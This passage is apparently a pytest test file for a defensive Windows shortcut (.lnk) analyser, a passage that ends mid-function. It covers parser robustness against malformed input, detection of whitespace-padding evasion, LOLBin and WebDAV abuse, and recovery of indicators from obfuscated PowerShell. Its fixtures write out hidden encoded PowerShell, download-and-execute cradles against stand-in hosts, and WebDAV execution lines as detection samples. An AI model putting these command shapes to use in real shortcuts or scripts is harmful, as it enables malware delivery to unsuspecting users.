"""Tests for lnk_analysis.

Three concerns, in descending order of how much they matter:

1. **The parser never raises and never spins.** Design rule 2 says a
   module must degrade gracefully rather than kill the pipeline, and a
   `.lnk` is the most hostile input in the project — malformed-by-design
   is the norm, and every size-prefixed structure in the format is an
   infinite-loop trap when the size is 0 or 1.
2. **The detection logic fires on the right shapes** — above all
   ZDI-CAN-25373, which is the one finding an analyst cannot see in
   Explorer's own UI.
3. **Scoring stays quiet on benign shortcuts.** A stock Start Menu entry
   targets `powershell.exe`; a module that calls that suspicious is
   worthless in a SOC.

Sample bytes are built here rather than shipped as fixtures so every
field under test is explicit and the malformed cases are readable.
"""

from __future__ import annotations

import base64
import copy

import pytest

from modules.static.lnk_analysis import run
from modules.static.lnk_analysis.command import analyse_padding
from modules.static.lnk_analysis.deobfuscate import bare_hosts, recover_iocs
from modules.static.lnk_analysis.indicators import derive_flags
from modules.static.lnk_analysis.parser import (
    HEADER_SIZE,
    LINK_CLSID,
    mac_from_guid,
    parse_bytes,
    shannon_entropy,
)
from modules.static.lnk_analysis.propstore import parse_property_store
from modules.static.lnk_analysis.scoring import score_lnk
from modules.static.lnk_analysis.shellitems import decode_shell_item, fat_timestamp
from reporting.terminal_reporter.lnk import lnk_rows, visualise_padding

# ---------------------------------------------------------------------------
# Builders
# ---------------------------------------------------------------------------

F_IDLIST = 0x01
F_LINKINFO = 0x02
F_NAME = 0x04
F_RELPATH = 0x08
F_WORKDIR = 0x10
F_ARGS = 0x20
F_ICON = 0x40
F_UNICODE = 0x80


def build_header(
    flags: int,
    *,
    attributes: int = 0x20,
    creation: int = 0,
    access: int = 0,
    write: int = 0,
    file_size: int = 0,
    icon_index: int = 0,
    reserved: bytes = b"\x00" * 10,
) -> bytes:
    """A 76-byte ShellLinkHeader with every offset spelled out."""
    return b"".join((
        HEADER_SIZE.to_bytes(4, "little"),
        LINK_CLSID,
        flags.to_bytes(4, "little"),
        attributes.to_bytes(4, "little"),
        creation.to_bytes(8, "little"),
        access.to_bytes(8, "little"),
        write.to_bytes(8, "little"),
        file_size.to_bytes(4, "little"),
        icon_index.to_bytes(4, "little", signed=True),
        (1).to_bytes(4, "little"),          # ShowCommand = SW_SHOWNORMAL
        (0).to_bytes(2, "little"),          # HotKey
        reserved,                            # Reserved1(2) + Reserved2(4) + Reserved3(4)
    ))


def string_data(text: str) -> bytes:
    """A StringData entry: uint16 *character* count, then UTF-16LE, no NUL."""
    encoded = text.encode("utf-16-le")
    return len(text).to_bytes(2, "little") + encoded


def build_lnk(
    *,
    name: str = "",
    relative_path: str = "",
    working_dir: str = "",
    arguments: str = "",
    icon: str = "",
    extra_flags: int = 0,
    idlist: bytes = b"",
    overlay: bytes = b"",
    **header_kwargs,
) -> bytes:
    """Assemble a complete, valid shell link from the parts given."""
    flags = F_UNICODE | extra_flags
    body = b""

    if idlist:
        flags |= F_IDLIST
        body += len(idlist).to_bytes(2, "little") + idlist

    for text, flag in (
        (name, F_NAME), (relative_path, F_RELPATH), (working_dir, F_WORKDIR),
        (arguments, F_ARGS), (icon, F_ICON),
    ):
        if text:
            flags |= flag

    # StringData must appear in spec order.
    for text in (name, relative_path, working_dir, arguments, icon):
        if text:
            body += string_data(text)

    terminal = (0).to_bytes(4, "little")
    return build_header(flags, **header_kwargs) + body + terminal + overlay


def item_id(payload: bytes) -> bytes:
    """Wrap a shell-item payload in its ItemIDSize field (which includes itself)."""
    return (len(payload) + 2).to_bytes(2, "little") + payload


def file_entry_item(
    name: str, *, size: int = 0, fat_modified: bytes = b"\x00" * 4,
    extension: bytes = b"",
) -> bytes:
    """A 0x32 file-entry shell item with an optional extension-block chain."""
    payload = b"".join((
        b"\x32\x00",
        size.to_bytes(4, "little"),
        fat_modified,
        (0x20).to_bytes(2, "little"),       # file attributes
        name.encode("ascii") + b"\x00",
    ))
    if len(payload) & 1:                    # extension blocks start 2-byte aligned
        payload += b"\x00"
    return payload + extension


def beef0004(
    *, version: int = 8, created: bytes = b"\x00" * 4, accessed: bytes = b"\x00" * 4,
    mft_entry: int = 0, mft_sequence: int = 0, long_name: str = "",
) -> bytes:
    """A BEEF0004 extension block — the one carrying the NTFS file reference."""
    reference = (mft_entry & 0x0000_FFFF_FFFF_FFFF) | ((mft_sequence & 0xFFFF) << 48)
    body = b"".join((
        (version).to_bytes(2, "little"),
        (0xBEEF0004).to_bytes(4, "little"),
        created,
        accessed,
        (0).to_bytes(2, "little"),          # unknown
        (0).to_bytes(2, "little"),          # unknown (v >= 7)
        reference.to_bytes(8, "little"),
        (0).to_bytes(8, "little"),          # unknown (v >= 7)
        (0).to_bytes(2, "little"),          # long string size (v >= 3)
        (0).to_bytes(4, "little"),          # unknown (v >= 8)
        long_name.encode("utf-16-le") + b"\x00\x00" if long_name else b"",
    ))
    return (len(body) + 2).to_bytes(2, "little") + body


def fat_date(year: int, month: int, day: int, hour: int, minute: int, second: int) -> bytes:
    date = ((year - 1980) << 9) | (month << 5) | day
    time = (hour << 11) | (minute << 5) | (second // 2)
    return date.to_bytes(2, "little") + time.to_bytes(2, "little")


# ---------------------------------------------------------------------------
# 1. Robustness — nothing raises, nothing spins
# ---------------------------------------------------------------------------

def _valid_prefix() -> bytes:
    return HEADER_SIZE.to_bytes(4, "little") + LINK_CLSID


MALFORMED_CASES = {
    "empty": b"",
    "one_byte": b"L",
    "truncated_magic": b"L\x00\x00\x00",
    "header_only_zeros": bytes(HEADER_SIZE),
    "wrong_clsid": HEADER_SIZE.to_bytes(4, "little") + bytes(16) + bytes(56),
    "wrong_header_size": (0x99).to_bytes(4, "little") + LINK_CLSID + bytes(56),
    # ItemIDSize 0 and 1 are the deliberate infinite-loop values: the field
    # includes its own two bytes, so the cursor would advance by <= 0.
    "itemid_size_zero": build_header(F_UNICODE | F_IDLIST) + (8).to_bytes(2, "little")
                        + b"\x00\x00\x00\x00\x00\x00\x00\x00",
    "itemid_size_one": build_header(F_UNICODE | F_IDLIST) + (8).to_bytes(2, "little")
                       + b"\x01\x00\x01\x00\x01\x00\x01\x00",
    "itemid_overruns_idlist": build_header(F_UNICODE | F_IDLIST)
                              + (4).to_bytes(2, "little") + (0xFFFF).to_bytes(2, "little")
                              + b"\x41\x41",
    "idlist_size_overruns_file": build_header(F_UNICODE | F_IDLIST)
                                 + (0xFFFF).to_bytes(2, "little") + b"\x41\x41",
    # CountCharacters claims 65535 characters in a file that ends immediately.
    "stringdata_overclaims": build_header(F_UNICODE | F_ARGS) + (0xFFFF).to_bytes(2, "little"),
    "stringdata_truncated": build_header(F_UNICODE | F_ARGS) + b"\x05",
    "odd_length_utf16": build_header(F_UNICODE | F_ARGS) + (3).to_bytes(2, "little") + b"AB\x00CD",
    # ExtraData: sizes below the 8-byte minimum, and each legal terminal value.
    "extra_block_size_zero": build_lnk(arguments="x")[:-4] + (0).to_bytes(4, "little"),
    "extra_block_size_four": build_lnk(arguments="x")[:-4] + (4).to_bytes(4, "little"),
    "extra_block_size_huge": build_lnk(arguments="x")[:-4] + (0xFFFFFFFF).to_bytes(4, "little"),
    "terminal_block_one": build_lnk(arguments="x")[:-4] + (1).to_bytes(4, "little"),
    "terminal_block_three": build_lnk(arguments="x")[:-4] + (3).to_bytes(4, "little"),
    # LinkInfo with offsets pointing outside the structure.
    "linkinfo_bad_offsets": build_header(F_UNICODE | F_LINKINFO)
                            + (0x1C).to_bytes(4, "little") + (0x1C).to_bytes(4, "little")
                            + (1).to_bytes(4, "little") + (0xFFFF).to_bytes(4, "little") * 4,
    "linkinfo_size_too_small": build_header(F_UNICODE | F_LINKINFO) + (2).to_bytes(4, "little"),
    "all_flags_set": build_header(0xFFFFFFFF),
    "garbage_filetime": build_header(F_UNICODE, creation=0xFFFFFFFFFFFFFFFF,
                                     access=0xFFFFFFFFFFFFFFFF,
                                     write=0xFFFFFFFFFFFFFFFF),
    "reserved_nonzero": build_header(F_UNICODE, reserved=b"\xff" * 10),
}


@pytest.mark.parametrize("name", sorted(MALFORMED_CASES))
def test_malformed_input_never_raises(name):
    """Design rule 2 under test — the whole point of a first-party parser."""
    parse_bytes(MALFORMED_CASES[name])


@pytest.mark.parametrize("name", sorted(MALFORMED_CASES))
def test_malformed_input_via_run_returns_a_valid_result(name, tmp_path):
    """The module contract holds even when the file is nonsense."""
    path = tmp_path / f"{name}.lnk"
    path.write_bytes(MALFORMED_CASES[name])

    result = run(path, {})

    assert result["module"] == "lnk_analysis"
    assert result["status"] in {"success", "skipped", "error"}
    assert isinstance(result["score_delta"], int)
    assert isinstance(result["reason"], str)
    assert isinstance(result["data"], dict)


def test_itemid_size_zero_terminates(tmp_path):
    """The classic hang. If the guard regresses, this test never returns."""
    data = MALFORMED_CASES["itemid_size_zero"]
    parsed = parse_bytes(data)
    assert parsed.shell_items == []


def test_extension_block_size_zero_terminates():
    """The same trap one level down, inside a shell item."""
    payload = file_entry_item("a.txt", extension=b"\x00\x00\x00\x00\x00\x00\x00\x00")
    item = decode_shell_item(payload)
    assert item.name == "a.txt"


def test_property_store_bogus_version_is_skipped():
    """An unrecognised storage version must not be decoded as if it were valid."""
    storage = (28).to_bytes(4, "little") + (0xDEADBEEF).to_bytes(4, "little") + bytes(20)
    assert parse_property_store(storage + bytes(4)) == []


def test_property_store_truncated_returns_empty():
    assert parse_property_store(b"\xff\xff\xff\xff") == []


# ---------------------------------------------------------------------------
# 2. Round-trip — the builder and the parser agree
# ---------------------------------------------------------------------------

def test_round_trip_recovers_every_string_field():
    data = build_lnk(
        name="Invoice",
        relative_path="..\\..\\Windows\\System32\\cmd.exe",
        working_dir="C:\\Users\\Public",
        arguments="/c echo hi",
        icon="%SystemRoot%\\System32\\imageres.dll",
    )
    parsed = parse_bytes(data)

    assert parsed.valid_magic
    assert parsed.name_string == "Invoice"
    assert parsed.relative_path == "..\\..\\Windows\\System32\\cmd.exe"
    assert parsed.working_dir == "C:\\Users\\Public"
    assert parsed.arguments == "/c echo hi"
    assert parsed.icon_location == "%SystemRoot%\\System32\\imageres.dll"
    assert parsed.overlay_size == 0


def test_overlay_is_carved_and_typed(tmp_path):
    """Nothing in the format puts bytes past the terminal block."""
    payload = b"MZ" + b"\x90" * 500
    path = tmp_path / "dropper.lnk"
    path.write_bytes(build_lnk(arguments="/c findstr TVqQ dropper.lnk", overlay=payload))

    data = run(path, {})["data"]

    assert data["overlay"]["kind"] == "pe"
    assert data["overlay"]["size"] == len(payload)
    assert data["embedded_executables"][0]["sha256"] == data["overlay"]["sha256"]
    assert "overlay_present" in data["indicator_flags"]


def test_extra_data_resynchronises_past_stray_bytes():
    """Real builders emit padding between StringData and ExtraData.

    MustangPanda samples carry six stray bytes there. Without resync the
    walk desynchronises and the TrackerDataBlock behind it — machine name
    and NIC MAC — is thrown away as overlay. LnkParse3 loses it too.
    """
    tracker = b"".join((
        (0x60).to_bytes(4, "little"),
        (0xA0000003).to_bytes(4, "little"),
        (0x58).to_bytes(4, "little"),
        (0).to_bytes(4, "little"),
        b"desktop-abc123\x00\x00",              # MachineID, 16 bytes
        bytes(16),                               # Droid volume
        bytes(16),                               # Droid file
        bytes(16),                               # DroidBirth volume
        bytes(16),                               # DroidBirth file
    ))
    assert len(tracker) == 0x60

    good = build_lnk(arguments="/c calc")
    spoiled = good[:-4] + b"\x10\x00\x00\x00\x6c\x00" + tracker + (0).to_bytes(4, "little")

    parsed = parse_bytes(spoiled)

    assert "TrackerDataBlock" in parsed.extra_blocks
    assert parsed.machine_id == "desktop-abc123"
    assert any("resynchronised" in a for a in parsed.anomalies)
    assert parsed.overlay_size == 0


def test_resync_will_not_invent_structure_in_an_overlay():
    """The window is bounded and needs a consistent size *and* signature."""
    payload = b"MZ" + b"\x90" * 4000
    parsed = parse_bytes(build_lnk(arguments="/c calc", overlay=payload))

    assert parsed.overlay_size == len(payload)
    assert parsed.extra_blocks == []


def test_entropy_of_a_single_valued_buffer_is_positive_zero():
    """`-0.0` renders as "-0.0" and reads like a parse failure.

    PureCrypter pads with 47 KiB of nulls, so this is not hypothetical.
    """
    value = shannon_entropy(b"\x00" * 4096)
    assert value == 0.0
    assert str(value) == "0.0"


def test_terminal_block_below_four_ends_the_structure():
    """The terminator is any uint32 < 4, not four zero bytes.

    A parser that insists on zero keeps walking into appended data and
    parses it as blocks — losing the overlay entirely.
    """
    for terminator in (0, 1, 2, 3):
        data = build_lnk(arguments="x")[:-4] + terminator.to_bytes(4, "little") + b"MZ\x90\x00"
        parsed = parse_bytes(data)
        assert parsed.overlay_size == 4, f"terminator {terminator} did not end the walk"


# ---------------------------------------------------------------------------
# 3. Shell items — the LECmd-depth fields
# ---------------------------------------------------------------------------

def test_file_entry_shell_item_decodes_name_and_size():
    item = decode_shell_item(file_entry_item("notepad.exe", size=360448))
    assert item.name == "notepad.exe"
    assert item.size == 360448
    assert item.type_name == "file entry"


def test_beef0004_yields_the_ntfs_file_reference():
    """MFT entry + sequence is what LECmd surfaces and LnkParse3 does not."""
    payload = file_entry_item(
        "notepad.exe",
        extension=beef0004(mft_entry=123456, mft_sequence=7, long_name="notepad.exe"),
    )
    item = decode_shell_item(payload)

    assert item.mft_entry == 123456
    assert item.mft_sequence == 7
    assert item.long_name == "notepad.exe"
    assert "0xBEEF0004" in item.extension_signatures


def test_fat_timestamps_decode_and_reject_garbage():
    assert fat_timestamp(fat_date(2024, 3, 15, 10, 30, 0)) == "2024-03-15T10:30:00"
    assert fat_timestamp(b"\x00\x00\x00\x00") is None       # "not set"
    assert fat_timestamp(b"\xff\xff\xff\xff") is None       # month 31, hour 31
    assert fat_timestamp(b"\x00\x00") is None               # truncated


def test_idlist_target_drops_the_root_folder_guid():
    """Every local-file shortcut starts with the "This PC" GUID.

    Carrying it into the target string would be noise, and would break the
    basename and user-directory checks downstream.
    """
    idlist = b"".join((
        item_id(b"\x1f\x50" + bytes.fromhex("e04fd020ea3a6910a2d808002b30309d")),
        item_id(b"\x2f" + b"C:\\\x00"),
        item_id(file_entry_item("Windows")),
        item_id(file_entry_item("cmd.exe")),
        b"\x00\x00",
    ))
    parsed = parse_bytes(build_lnk(idlist=idlist))

    assert parsed.idlist_target == "C:\\Windows\\cmd.exe"
    assert parsed.shell_items[0].guid is not None       # still kept for forensics


# ---------------------------------------------------------------------------
# 4. Property store
# ---------------------------------------------------------------------------

_STORAGE_FMTID = bytes.fromhex("30f125b7ef471a10a5f102608c9eebac")  # B725F130-…


def _property_storage(fmtid: bytes, prop_id: int, text: str) -> bytes:
    """One integer-named storage holding a single VT_LPWSTR value."""
    chars = text.encode("utf-16-le") + b"\x00\x00"
    value = b"".join((
        (0).to_bytes(4, "little"),          # placeholder, patched below
        prop_id.to_bytes(4, "little"),
        b"\x00",
        (0x001F).to_bytes(2, "little"),     # VT_LPWSTR
        (0).to_bytes(2, "little"),          # padding
        (len(chars) // 2).to_bytes(4, "little"),
        chars,
    ))
    value = len(value).to_bytes(4, "little") + value[4:]

    storage = b"".join((
        (0).to_bytes(4, "little"),          # placeholder
        (0x53505331).to_bytes(4, "little"),
        fmtid,
        value,
        (0).to_bytes(4, "little"),          # end of values
    ))
    return len(storage).to_bytes(4, "little") + storage[4:]


def test_known_property_renders_its_canonical_name():
    blob = _property_storage(_STORAGE_FMTID, 10, "Invoice.pdf") + bytes(4)
    properties = parse_property_store(blob)

    assert len(properties) == 1
    assert properties[0]["name"] == "System.ItemNameDisplay"
    assert properties[0]["value"] == "Invoice.pdf"


def test_unmapped_property_renders_raw_rather_than_vanishing():
    """An unknown FMTID/PID must stay visible — the map is deliberately partial."""
    unknown = bytes.fromhex("0102030405060708090a0b0c0d0e0f10")
    blob = _property_storage(unknown, 999, "value") + bytes(4)
    properties = parse_property_store(blob)

    assert len(properties) == 1
    assert "999" in properties[0]["name"]
    assert properties[0]["value"] == "value"


# ---------------------------------------------------------------------------
# 5. Padding evasion — ZDI-CAN-25373 / CVE-2025-9491
# ---------------------------------------------------------------------------

def test_zdi_padding_detected_when_content_hides_past_the_visible_window():
    padding = analyse_padding(" " * 300 + "/c powershell -enc SQBFAFgA")

    assert padding.zdi_can_25373
    assert padding.tier == "strong"
    assert padding.max_run == 300
    assert padding.visible_whitespace_ratio == 1.0
    assert padding.content_beyond_visible


def test_short_padding_is_not_zdi():
    """Under the 260-character visible window there is nothing to hide behind."""
    padding = analyse_padding(" " * 30 + "/c echo hi")
    assert not padding.zdi_can_25373
    assert padding.tier == "medium"


def test_ordinary_arguments_produce_no_padding_signal():
    padding = analyse_padding("-ExecutionPolicy Bypass -File script.ps1")
    assert padding.tier == "none"
    assert not padding.zdi_can_25373


def test_non_printing_padding_is_always_strong():
    """0x0B/0x0C/0x11-0x13 render as nothing and are never innocent."""
    padding = analyse_padding("a\x0b\x0cb")
    assert padding.tier == "strong"
    assert padding.exotic_chars == ["0x0B", "0x0C"]


def test_zdi_shortcut_scores_malicious(tmp_path):
    """End-to-end: the headline detection reaches the score."""
    path = tmp_path / "zdi.lnk"
    path.write_bytes(build_lnk(
        relative_path="..\\..\\Windows\\System32\\cmd.exe",
        arguments=" " * 280 + "/c powershell -w hidden -enc SQBFAFgAIABJAFcAUgA=",
    ))

    result = run(path, {})

    assert result["status"] == "success"
    assert result["data"]["classification"] == "MALICIOUS"
    assert "args_padding_zdi" in result["data"]["indicator_flags"]
    assert any("ZDI-CAN-25373" in rule for rule in result["data"]["fired_rules"])


# ---------------------------------------------------------------------------
# 6. Scoring calibration
# ---------------------------------------------------------------------------

def test_stock_start_menu_shortcut_stays_quiet():
    """`Windows PowerShell.lnk` ships with Windows.

    A LOLBin target alone is worth 5 — INFORMATIONAL. If this ever climbs
    into SUSPICIOUS the module is unusable on a real desktop.
    """
    delta, _reason, _fired, classification = score_lnk(frozenset({"lolbin_target"}))

    assert delta == 5
    assert classification == "INFORMATIONAL"


def test_score_is_capped():
    everything = frozenset(
        flag for rule in __import__(
            "modules.static.lnk_analysis.scoring", fromlist=["COMBO_RULES"]
        ).COMBO_RULES for flag in rule[0]
    )
    delta, _reason, fired, classification = score_lnk(everything)

    assert delta == 60                      # SCORE_CAP
    assert classification == "MALICIOUS"
    assert len(fired) > 10


def test_no_flags_is_clean():
    delta, reason, fired, classification = score_lnk(frozenset())

    assert (delta, classification, fired) == (0, "CLEAN", [])
    assert reason == "No LNK indicators fired"


def test_lolbin_combinations_escalate():
    """Each added signal must raise the score — combinations carry the weight."""
    base = score_lnk(frozenset({"lolbin_target"}))[0]
    encoded = score_lnk(frozenset({"lolbin_target", "encoded_powershell"}))[0]
    padded = score_lnk(frozenset({"lolbin_target", "encoded_powershell",
                                  "args_padding_zdi"}))[0]

    assert base < encoded < padded


# ---------------------------------------------------------------------------
# 7. Indicators
# ---------------------------------------------------------------------------

def _flags_for(**kwargs) -> frozenset[str]:
    from modules.static.lnk_analysis import command as command_module

    parsed = parse_bytes(build_lnk(**kwargs))
    return derive_flags(parsed, command_module.analyse(parsed))


def test_icon_masquerade_needs_both_halves():
    """A document icon only matters in front of an executable target."""
    masquerade = _flags_for(
        relative_path="cmd.exe",
        icon="%SystemRoot%\\System32\\imageres.dll",
    )
    assert "icon_masquerade" in masquerade

    innocent = _flags_for(
        relative_path="report.docx",
        icon="%SystemRoot%\\System32\\imageres.dll",
    )
    assert "icon_masquerade" not in innocent


def test_remote_icon_is_flagged():
    flags = _flags_for(relative_path="notepad.exe", icon="\\\\10.0.0.5\\share\\a.ico")
    assert "remote_icon_location" in flags


def test_deep_traversal_is_flagged():
    flags = _flags_for(relative_path="..\\" * 12 + "Windows\\System32\\cmd.exe")
    assert "long_relative_path_traversal" in flags

    shallow = _flags_for(relative_path="..\\..\\notepad.exe")
    assert "long_relative_path_traversal" not in shallow


def test_double_extension_is_flagged():
    assert "double_extension_name" in _flags_for(name="Invoice.pdf.lnk")
    assert "double_extension_name" in _flags_for(name="Statement.docx.exe")
    # Padded with further suffixes to push the executable one out of sight.
    assert "double_extension_name" in _flags_for(name="Invoice.pdf.lnk.txt")
    assert "double_extension_name" not in _flags_for(name="Invoice")
    assert "double_extension_name" not in _flags_for(name="Invoice.pdf")


@pytest.mark.parametrize("name", [
    "report.pdf.backup",        # ordinary backup copy
    "notes.txt.old",            # ordinary versioned copy
    "archive.pdf.2024",
    "data.csv.gz",              # a real compressed CSV
    "photo.jpg.thumb",
])
def test_double_extension_does_not_fire_on_ordinary_names(name):
    """A document extension somewhere in a name is not deception.

    The extension has to sit immediately before an *executable* one —
    otherwise every backup and versioned copy on a shared drive trips it.
    """
    assert "double_extension_name" not in _flags_for(name=name)


def test_double_extension_reads_the_shortcut_filename(tmp_path):
    """``Invoice.pdf.lnk`` is what the victim sees, and it is not stored
    in any field inside the file — it has to come from the filename."""
    path = tmp_path / "Invoice.pdf.lnk"
    path.write_bytes(build_lnk(relative_path="cmd.exe"))

    data = run(path, {})["data"]

    assert data["double_extension"] == "invoice.pdf.lnk"
    assert "double_extension_name" in data["indicator_flags"]


def test_suspicious_host_is_flagged():
    flags = _flags_for(
        relative_path="mshta.exe",
        arguments="http://sub.xsph.ru/loader.xml",
    )
    assert "suspicious_host" in flags
    assert "remote_url_in_args" in flags


def test_webdav_remote_execution_is_flagged():
    """`\\\\host@SSL\\share` runs a payload without downloading a file.

    None of the download-cradle patterns can fire on it, so it needs its
    own rule. Taken from the DonutLoader sample.
    """
    flags = _flags_for(
        relative_path="winrm.cmd",
        arguments="&st^art\\\\amazom.my@SSL\\webdav\\1.pdf&&call "
                  "\\\\amazom.my@SSL\\webdav\\yyy.bat",
    )
    assert "webdav_remote_exec" in flags
    assert "lolbin_target" in flags        # winrm.cmd is a LOLBAS script


def test_non_exe_lolbas_scripts_count_as_lolbins():
    """Signed Microsoft scripts in System32 execute just as well as binaries."""
    for target in ("winrm.cmd", "pubprn.vbs", "syncappvpublishingserver.vbs"):
        assert "lolbin_target" in _flags_for(relative_path=target), target


def test_delayed_expansion_obfuscation_is_detected():
    """`cmd /V:ON` + `pow!x!rsh!x!ll` defeats every plain keyword match.

    Both the Formbook and ITA samples are built this way; without this
    rule their entire command line reads as innocuous.
    """
    flags = _flags_for(
        relative_path="conhost.exe",
        arguments='--headless cm""d /V:ON /c "set ru=e&& pow!ru!rsh!ru!ll '
                  'g!ru!t-cont!ru!nt"',
    )
    assert "obfuscation" in flags


def test_quote_insertion_obfuscation_is_detected():
    flags = _flags_for(relative_path="cmd.exe", arguments='power""shell -c calc')
    assert "obfuscation" in flags


def test_ordinary_arguments_are_not_obfuscation():
    """The new patterns must not fire on a normal command line."""
    flags = _flags_for(
        relative_path="notepad.exe",
        arguments='"C:\\Users\\Alice\\Documents\\notes.txt"',
    )
    assert "obfuscation" not in flags
    assert "webdav_remote_exec" not in flags
    assert "unc_in_arguments" not in flags


# ---------------------------------------------------------------------------
# Deobfuscation
#
# Every case below is the shape of a real sample in the corpus, but the
# transforms are generic primitives — reverse, base64, character doubling,
# Replace() chains — not per-campaign signatures.
# ---------------------------------------------------------------------------

def test_reversed_url_is_recovered():
    """PhantomGate ships the URL backwards and reverses it at runtime."""
    url = "https://crixup.com/downloads/Faix2.bat"
    iocs, chains = recover_iocs(f"-nop -w hidden \"$s='{url[::-1]}';"
                                "(New-Object Net.WebClient).DownloadFile("
                                "-join $s[$s.Length..0],$f)\"")
    assert url in iocs
    assert "reverse" in chains


def test_encoded_command_is_decoded():
    """PowerShell -EncodedCommand is UTF-16LE base64."""
    script = "$u='http://203.0.113.44:8080/a.exe'; iwr $u -OutFile $e"
    blob = base64.b64encode(script.encode("utf-16-le")).decode()
    iocs, chains = recover_iocs(f"-nop -w hidden -EncodedCommand {blob}")

    assert "http://203.0.113.44:8080/a.exe" in iocs
    assert "base64" in chains


def test_line_wrapped_base64_is_decoded():
    """PowerShell wraps its own -EncodedCommand output at 76 columns.

    A regex anchored to an unbroken run decodes only the first line. A
    class that also accepts spaces is worse — it starts the match at
    `EncodedCommand`, shifting the payload and yielding binary noise.
    """
    script = "iwr 'http://198.51.100.7/p.bin' -OutFile $x"
    blob = base64.b64encode(script.encode("utf-16-le")).decode()
    wrapped = "\r\n".join(blob[i:i + 76] for i in range(0, len(blob), 76))
    iocs, _ = recover_iocs(f"-EncodedCommand {wrapped}")

    assert "http://198.51.100.7/p.bin" in iocs


def test_replace_chain_is_undone():
    """DonutLoader and ResolverRAT both substitute digits for letters."""
    obfuscated = (
        "powershell -c \"$x='7ttps://r4w.8it7u9userc0ntent.c0m/x/y.cmd'"
        ".Replace('7','h').Replace('4','a').Replace('8','g')"
        ".Replace('9','b').Replace('0','o');iwr $x\""
    )
    iocs, chains = recover_iocs(obfuscated)

    assert any("raw.githubusercontent.com" in i for i in iocs)
    assert "replace-chain" in chains


def test_layered_chain_is_recovered_and_reported():
    """Grandoreiro needs base64, then base64, then reverse, then de-double.

    The chain string matters as much as the IOC: an indicator that only
    exists after four decode layers needs its provenance shown, or an
    analyst cannot distinguish it from a parser hallucination.
    """
    url = "https://evil.example.com/stage2.zip"
    doubled = "".join(c * 2 for c in url[::-1])
    inner = base64.b64encode(doubled.encode()).decode()
    script = f"$t=[Convert]::FromBase64String(\"{inner}\"); iex $t"
    outer = base64.b64encode(script.encode("utf-16-le")).decode()

    iocs, chains = recover_iocs(f"-EncodedCommand {outer}")

    assert url in iocs
    assert any("de-double" in c and "reverse" in c for c in chains)


def test_bare_host_without_a_scheme_is_found():
    """`iex(irm 'noventis8.com' -useb)` carries no http:// at all."""
    assert "noventis8.com" in bare_hosts("-c \"iex(irm 'noventis8.com' -useb)\"")


def test_dotnet_namespaces_are_not_reported_as_hosts():
    """`System.IO` and `Microsoft.Win32` match a hostname shape."""
    found = bare_hosts("[SyStem.IO.File]::OpenReAd($x); [Microsoft.Win32.Registry]")
    assert found == []


def test_private_addresses_are_not_reported_as_c2():
    """`ping 127.0.0.1 -n 2` is a sleep, not an indicator."""
    script = "start; ping 127.0.0.1 -n 2; iwr http://10.0.0.5/x; iwr http://192.168.1.9/y"
    blob = base64.b64encode(script.encode("utf-16-le")).decode()
    iocs, _ = recover_iocs(f"-EncodedCommand {blob}")

    assert not any(i in ("127.0.0.1", "10.0.0.5", "192.168.1.9") for i in iocs)


def test_deobfuscation_is_bounded_on_hostile_input():
    """A crafted argument must not turn expansion into a bomb."""
    import time

    nested = "A" * 40
    for _ in range(6):
        nested = base64.b64encode(f"'{nested}'".encode()).decode()

    start = time.monotonic()
    iocs, chains = recover_iocs(nested + " " + "\\" * 5000 + " " + "'" * 2000)
    elapsed = time.monotonic() - start

    assert elapsed < 5.0
    assert len(iocs) <= 50
    assert len(chains) <= 10


def test_clean_command_line_yields_nothing():
    iocs, chains = recover_iocs('"C:\\Users\\Alice\\Documents\\quarterly report.docx"')
    assert iocs == []
    assert chains == []


def test_fabricated_timestamps_detected():
    identical = parse_bytes(build_lnk(creation=132000000000000000,
                                      access=132000000000000000,
                                      write=132000000000000000))
    from modules.static.lnk_analysis import command as command_module
    flags = derive_flags(identical, command_module.analyse(identical))
    assert "timestamps_fabricated" in flags


def test_mac_extraction_requires_a_version_1_uuid():
    """A v4 UUID's last six bytes are random, not a NIC address."""
    v1 = bytes.fromhex("00000000") + bytes.fromhex("0000") + (0x1234).to_bytes(2, "little") \
        + b"\x00\x00" + bytes.fromhex("080027abcdef")
    assert mac_from_guid(v1) == "08:00:27:ab:cd:ef"

    v4 = bytes.fromhex("00000000") + bytes.fromhex("0000") + (0x4234).to_bytes(2, "little") \
        + b"\x00\x00" + bytes.fromhex("080027abcdef")
    assert mac_from_guid(v4) is None

    assert mac_from_guid(b"\x00" * 15) is None


def test_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"\x00" * 1000) == 0.0
    assert shannon_entropy(bytes(range(256))) == pytest.approx(8.0)


# ---------------------------------------------------------------------------
# 8. Module contract
# ---------------------------------------------------------------------------

def test_non_lnk_file_is_skipped(tmp_path):
    path = tmp_path / "notes.txt"
    path.write_text("just some text")

    result = run(path, {})

    assert result["status"] == "skipped"
    assert result["score_delta"] == 0
    assert "not a Windows shortcut" in result["reason"]


def test_missing_file_is_an_error(tmp_path):
    result = run(tmp_path / "absent.lnk", {})
    assert result["status"] == "error"
    assert result["score_delta"] == 0


def test_size_cap_skips_without_reading(tmp_path):
    path = tmp_path / "huge.lnk"
    path.write_bytes(build_lnk(arguments="x") + b"\x00" * (2 * 1024 * 1024))

    result = run(path, {"max_lnk_size_mb": 1})

    assert result["status"] == "skipped"
    assert "size cap" in result["reason"]


def test_config_codepage_is_honoured(tmp_path):
    """An unknown codec name must degrade, not raise."""
    path = tmp_path / "a.lnk"
    path.write_bytes(build_lnk(arguments="/c echo hi"))

    result = run(path, {"lnk_ansi_codepage": "not-a-real-codec"})

    assert result["status"] == "success"


# ---------------------------------------------------------------------------
# 9. Row builder
# ---------------------------------------------------------------------------

def test_lnk_rows_is_empty_safe():
    assert lnk_rows({}, 0) == []
    assert lnk_rows({"unrelated": 1}, 0) == []


def test_lnk_rows_is_pure(tmp_path):
    path = tmp_path / "a.lnk"
    path.write_bytes(build_lnk(relative_path="cmd.exe", arguments=" " * 280 + "/c calc"))
    data = run(path, {})["data"]

    before = copy.deepcopy(data)
    lnk_rows(data, 0)
    lnk_rows(data, 2)

    assert data == before


def test_lnk_rows_severities_are_valid(tmp_path):
    path = tmp_path / "a.lnk"
    path.write_bytes(build_lnk(relative_path="cmd.exe", arguments="/c calc"))
    data = run(path, {})["data"]

    for row in lnk_rows(data, 2):
        assert row.severity in {"bad", "warn", "info"}


def test_padding_is_visible_in_the_rendered_row():
    """A blank column is exactly the failure the attack relies on."""
    rendered = visualise_padding(" " * 300 + "/c calc")
    assert "<300 spaces>" in rendered
    assert "/c calc" in rendered


def test_visualise_padding_leaves_normal_text_alone():
